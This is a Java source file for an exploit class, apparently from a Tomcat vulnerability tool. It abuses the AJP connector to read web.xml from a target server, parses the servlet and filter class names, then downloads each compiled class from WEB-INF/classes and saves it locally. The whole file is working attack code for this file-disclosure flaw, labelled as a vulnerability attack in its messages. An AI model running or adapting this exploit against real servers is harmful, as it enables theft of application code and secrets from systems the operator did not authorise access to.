package org.dudu.TomcatVuln.Exploit;

import com.github.jrialland.ajpclient.SimpleForwardResponse;
import org.dudu.TomcatVuln.DTO.AjpRequestDTO;
import org.dudu.TomcatVuln.Interface.strategy.ExecuteStrategy;
import org.dudu.TomcatVuln.request.AjpRequest;

import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamReader;
import javax.xml.stream.events.XMLEvent;
import java.io.FileOutputStream;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.List;

public class AjpExploit  extends AjpRequest implements ExecuteStrategy<AjpRequestDTO> {
    @Override
    public String mark() {
        return "ajp";
    }

    @Override
    public String execute(AjpRequestDTO requestParam) throws Exception {
        // 请求tomcat
        SimpleForwardResponse response = this.request_response(requestParam);
        FileOutputStream fileOutputStream = null;
        //解析xml获取到class路径
        try {
            String prefix = "WEB-INF/classes/";
            String suffix = ".class";
            XMLInputFactory factory = XMLInputFactory.newInstance();
            XMLStreamReader reader = factory.createXMLStreamReader(new StringReader(response.getResponseBodyAsString()));
            List<String> servletNames = new ArrayList<>();
            List<String> filterNames = new ArrayList<>();
            StringBuilder result = new StringBuilder();
            while (reader.hasNext()) {
                int eventType = reader.next();
                switch (eventType) {
                    case XMLEvent.START_ELEMENT:
                        String elementName = reader.getLocalName();
                        if ("servlet-class".equals(elementName)) {
                            String name = reader.getElementText();
                            String servletName = name.replace(".", "/");
                            servletNames.add(servletName);
                            System.out.println("servlet-class: " + prefix + servletName + suffix);
                        }
                        else if("filter-class".equals(elementName)) {
                            String name = reader.getElementText();
                            String filtername = name.replace(".", "/");
                            filterNames.add(filtername);
                            System.out.println("filter-class: " + prefix + filtername + suffix);
                        }
                        break;
                }
            }
            for(String filterPath:filterNames){
                SimpleForwardResponse resp = request_response(requestParam.getUri(), prefix+filterPath+suffix, requestParam.getIp(), requestParam.getPort());
                byte [] bytes = resp.getResponseBodyAsBytes();
                String filtername = filterPath.substring(filterPath.lastIndexOf("/")+1)+suffix;
                fileOutputStream = new FileOutputStream(filtername);
                fileOutputStream.write(bytes);
                result.append(filtername+"读取完成\n");
            }
            for(String servletPath:servletNames){
                SimpleForwardResponse resp = request_response(requestParam.getUri(), prefix+servletPath+suffix, requestParam.getIp(), requestParam.getPort());
                String servletName = servletPath.substring(servletPath.lastIndexOf("/")+1)+suffix;
                fileOutputStream = new FileOutputStream(servletName);
                fileOutputStream.write(resp.getResponseBodyAsBytes());
                result.append(servletName+"读取完成\n");
            }
            return result.toString();
        }
        catch (Exception e){
            e.printStackTrace();
            return "AJP协议漏洞攻击失败";
        }finally {
            fileOutputStream.close();
        }
    }
}
